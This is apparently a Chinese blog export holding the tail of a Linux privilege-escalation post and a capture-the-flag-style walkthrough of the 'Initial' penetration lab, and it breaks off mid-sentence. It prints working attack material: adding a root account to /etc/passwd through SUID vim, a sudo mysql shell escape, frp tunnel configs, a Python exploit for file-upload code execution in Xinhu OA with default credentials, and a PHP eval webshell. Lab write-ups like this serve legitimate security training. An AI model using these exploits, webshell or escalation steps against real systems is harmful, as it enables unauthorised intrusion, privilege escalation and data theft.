\；</span><br></pre></td></tr></table></figure></div><p>可用于提权的文件有</p><blockquote><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p></blockquote><p>利用vim提权的思路是修改<code>etc/passwd</code>文件，为自己添加一个有<code>root</code>权限的用户</p><p>passwd文件用户格式为：<code>用户名:密码:uid:gid:注释:home目录:用户的shell</code></p><p>这边可以看看root用户的格式<code>root:x:0:0:root:/root:/bin/bash</code> （密码这部分之所以是x，是因为真正的密码存在&#x2F;etc&#x2F;shadow文件里）</p><p>生成密码：用<code>openssl passwd -1 –salt asd 123</code> （这里是-1（数字1）不是L）<br><img src="https://pic1.zhimg.com/80/v2-d6252d97872addc02b99d863b0e8adad_1440w.png"><br>直接写在passwd文件里面,<code>toor:$1$asd$sTMDZlRI6L.jJEw2I.3×8.:0:0:root:/toor:/bin/bash</code></p><p>用<code>vim /etc/passwd</code>可以修改，但是在保存是会出现E212，无法保存，提示我们没有权限修改这个</p><p>这时应该用之前find找到的vim.basic文件运行，这个程序是有suid权限的</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /etc/passwd</span><br></pre></td></tr></table></figure></div><p>用这个打开，然后修改文件，就可以成功保存</p><p><code>su toor</code>切换，密码<code>123</code>，再<code>id</code>查看一下权限,成功提权</p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Initial</title>
      <link href="/2024/09/22/Initial/"/>
      <url>/2024/09/22/Initial/</url>
      
        <content type="html"><![CDATA[<h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>圈圈表示你太菜了，并反手向你丢了7个沙砾(qwq)</p><p>钱队一直说渗透很重要，这次就用这个最简单的靶场来进行正式的入门(希望不会在明年7月留下遗憾)</p><h1 id="开始！"><a href="#开始！" class="headerlink" title="开始！"></a>开始！</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>题目给出了一个ip地址39.101.193.135，我们可以使用nmap来看看他开启了那些端口，命令为</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap --min-rate 10000 39.101.193.135</span><br></pre></td></tr></table></figure></div><p>这段命令是以最小速率 10000 对全部端口（1-65535）进行扫描，10000 是权衡的结果，数字过大扫描速度快，但容易遗漏端口，数字过小则扫描时间过长，经验表明 10000 就是扫描的合适速度。-p 是端口参数，-p- 表示对所有端口进行扫描。扫描结果如下：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# <span class="built_in">sudo</span> nmap --min-rate 10000 39.101.193.135        </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 21:49 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 39.101.193.135</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.96 seconds</span><br></pre></td></tr></table></figure></div><p>可以看到开启了 22、80 端口，22 端口是一个 ssh 服务，80 端口是一个 http 服务，接下来我们可以查看这个几个端口开启的服务和操作系统版本，命令如下：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sT –sV -O –p22,80 39.101.193.135</span><br></pre></td></tr></table></figure></div><p>其中<code>-sT</code>表示进行<code>TCP</code>扫描（三次握手）,<code>-p</code>表示待扫描的端口（后跟待扫描的端口 22、80）<code>-sV</code>表示探测开放服务的版本,<code>-O</code>表示探测操作系统版本，扫描结果如下：<br><img src="https://picx.zhimg.com/80/v2-ba63118630c5c443fd93d3aeb572a921_1440w.png"></p><p>可以看到这个ip是一台 ubuntu linux 服务器，好像也没有什么有用的信息，想到还有一个非常好用的扫描工具<code>fscan</code></p><p>安装看<a href="https://github.com/shadow1ng/fscan/releases">fscan安装教程</a>,在这个页面直接下载，不用按网上的教程配go环境编译，不然会被圈圈骂(bushi</p><p>这个工具有linux和windows版本，其具体用法可以看官方的文档，这里只用于进行简单的端口扫描，(cmd)输入：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan -h 39.101.193.135</span><br></pre></td></tr></table></figure></div><p>结果如下：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">D:\PenetrationW&gt;.\fscan -h 39.101.193.135</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.101.193.135:22 open</span></span><br><span class="line"><span class="string">39.101.193.135:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.101.193.135     code:200 len:5578   title:Bootstrap Material Admin</span></span><br><span class="line"><span class="string">[+] PocScan http://39.101.193.135 poc-yaml-thinkphp5023-method-rce poc1</span></span><br><span class="line"><span class="string">已完成 2/2</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 47.871504s</span></span><br></pre></td></tr></table></figure></div><p>可以看到 web server 的版本是<code>ThinkPHP 5.0.23</code>，而且存在漏洞！！！<br>当然也可以使用nmap命令来进行漏洞扫描，命令如下：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure></div><p>这里使用ThinkphpGUI这个开源工具来进行扫一下，<br>工具链接为：<a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。 (github.com)</a></p><p>输入<code>url</code>和选择版本后点击检测和<code>GetShell</code>即可</p><p><img src="https://pica.zhimg.com/80/v2-453c44f80de04d6cba51b6bfc76e0d86_1440w.png"></p><p>可以看到网页存在一个后门，工具还给了一个漏洞利用的<code>poc</code>，我们利用他给的<code>poc</code>来写入<code>shell.php</code>后门，但是没什么回显</p><p>那就用蚁剑连接一下剩下的那个后门，成功连接</p><p>接下来就是需要提取，我们先看一下自己是什么权限(蚁剑的虚拟终端)：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu-web01 5.4.0-110-generic <span class="comment">#124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure></div><p>可以看见是<code>www-data</code>权限(无法进入root文件夹)，但是输入<code>sudo -l</code>时回显</p><blockquote><p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>这说明我们可以通过通过<code>sudo</code>高权限运行<code>mysql</code>，进而能够执行 root权限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法<a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客</a></p><p>于是我们就能很容易的获取到<code>flag1</code>，可以发现<code>flag1</code>在<code>/root/flag</code>目录下</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! ls /root&#x27;</span></span><br><span class="line">flag</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! ls /root/flag&#x27;</span></span><br><span class="line">flag01.txt</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span></span><br><span class="line"> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ </span><br><span class="line">░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██</span><br><span class="line"> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ </span><br><span class="line">  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         </span><br><span class="line">   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████</span><br><span class="line">  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██</span><br><span class="line"> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ </span><br><span class="line">░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  </span><br><span class="line">Congratulations!!! You found the first flag, the next flag may be <span class="keyword">in</span> a server <span class="keyword">in</span> the internal network.</span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure></div><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 flag，我们先用蚁剑上传 fscan，扫描一下内网中有那些存活机器</p><p>这里要记得给<code>fscan</code>执行权限<code>chmod 777 fscan</code>，否则会执行不了<br>通过<code>ip a</code>我们可以发现网段为<code>172.22.1.0/24</code></p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure></div><p>扫描的结果会自动存在当前目录的<code>result.txt</code>文件上</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">chmod</span> 777 fscan</span><br><span class="line">(www-data:/var/www/html) $ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:16:3e:1e:d4:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315358560sec preferred_lft 315358560sec</span><br><span class="line">    inet6 fe80::216:3eff:fe1e:d400/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">(www-data:/var/www/html) $ ./fscan -h 172.22.1.0/24</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">ls</span></span><br><span class="line">favicon.ico</span><br><span class="line">fscan</span><br><span class="line">index.php</span><br><span class="line">peiqi.php</span><br><span class="line">result.txt</span><br><span class="line">robots.txt</span><br><span class="line">router.php</span><br><span class="line">static</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">cat</span> result.txt</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure></div><p>于是我们搜集到如下信息：</p><blockquote><p>172.22.1.2:DC域控<br>172.22.1.21:Windows的机器并且存在MS17-010 漏洞<br>172.22.1.18:信呼OA办公系统</p></blockquote><p>而我们的最终目标即为<code>DC</code>域控<br>我们首先是对<code>OA</code>办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务，这里我们需要一台<code>vps</code>和工具<code>frp</code>，学过web的师傅都知道 vps 是什么，这里就不做解释，<code>frp</code>的相关知识也请读者自行学习，这里只做简单的介绍。frp的下载地址为，有linux和windows版本：<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a></p><p>其中<code>frpc</code>和<code>frps</code>是可执行文件，我们需要将<code>frps</code>和<code>frps.ini</code>上传到我们的vps<code>frpc</code>和<code>frpc.ini</code>上传到我们的靶机</p><p>下面是我相关文件的配置<br>frpc.ini：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 123.249.99.71 # 我vps的ip地址</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure></div><p>frps.ini:</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure></div><p>这里要确保你的 vps 开启了 7000 和 798 端口</p><p>在<code>vps</code>执行</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure></div><p>然后在靶机执行：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure></div><p>(顺序不能反)</p><p>最后在攻击机你自己的电脑上（windows，不是 kali，kali 的配置方法在后面有讲）使用Proxy Servers配置 socks5 代理即可(不能提前开)</p><p><img src="https://picx.zhimg.com/80/v2-2b86edd2de4b8b1ae960e065a339a300_1440w.png"></p><p>配置完后就能直接在浏览器中输入<code>172.22.1.18</code>进行访问了，可以看到该系统的版本是<code>2.2.8</code>（这个是重点，可以通过搜索系统的版本号看看有没有已经给发现的漏洞）</p><p><img src="https://pica.zhimg.com/80/v2-d65497a7e19ca02e88b09378f4ff194b_1440w.png"></p><p>这里存在一个弱口令，admin&#x2F;admin123</p><p>这个系统存在文件上传漏洞，有直接的poc,直接参考<a href="https://blog.csdn.net/solitudi/article/details/118675321">[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a></p><p>exp用上面那个会报错，在网上又找了一个，下面的可以<br>exp.py：</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div><p>相同目录下还有一个 1.php 文件存的是一句话木马<br>1.php:</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>运行后可以看到文件上传的路径</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS D:\PenetrationW\script&gt; &amp; d:/ProgrammingLanguage/Python31/python3.exe d:/PenetrationW/script/exp.py</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined offset: 1 <span class="keyword">in</span> &lt;b&gt;C:\phpStudy\PHPTutorial\WWW\upload\2024-09\22_11172620.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure></div><p>然后直接蚁剑连接(记得蚁剑也要在代理设置里面设置socks5代理)</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\PHPTutorial\WWW\upload\2024-09&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"><span class="comment"># 可以看到已经拥有了 system 权限，我们直接在 Administrator 用户的目录下找到 flag2</span></span><br></pre></td></tr></table></figure></div><p>我们直接在<code>Administrator</code>用户的目录下找到 flag2</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ___    ___ ___  ________  ________  ________  ________  ________   ________     </span><br><span class="line">|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    </span><br><span class="line">\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    </span><br><span class="line"> \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  </span><br><span class="line">  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ </span><br><span class="line"> /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\</span><br><span class="line">/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|</span><br><span class="line">|__|/ \|__|                                                                      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag02: 2ce3-4813-87d4-</span><br><span class="line"></span><br><span class="line">Awesome! ! ! You found the second flag, now you can attack the domain controller.</span><br><span class="line"><span class="comment">#还提示我们最后要打DC</span></span><br></pre></td></tr></table></figure></div><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来我们就对<code>ip 172.22.1.21</code>进行渗透，这里需要用到渗透框架<code>Metasploit Framework</code>，kali自带这个框架，这里的攻击机我选用kali（windows也可以安装Metasploit Framework，不过上面我说过也要讲讲如何在kali设置代理）。我们首先要在<code>kali</code>中设置<code>socks5</code>代理，否则我们无法访问其内网的环境。<br>在<code>kali</code>中设置代理比<code>windows</code>简单很多，他自带了一个<code>proxychains4</code>工具，我们只需要编辑<code>etc</code>目录下的<code>proxychians4.conf</code>文件：</p><p>在最下面的ProxyList上加上<code>socks5 vps ip</code>端口 即可</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 123.249.99.71 798</span><br></pre></td></tr></table></figure></div><p>然后就能在浏览器中访问靶机内网的 172.22.1.* 那三台机器了<br>在上面用 fscan 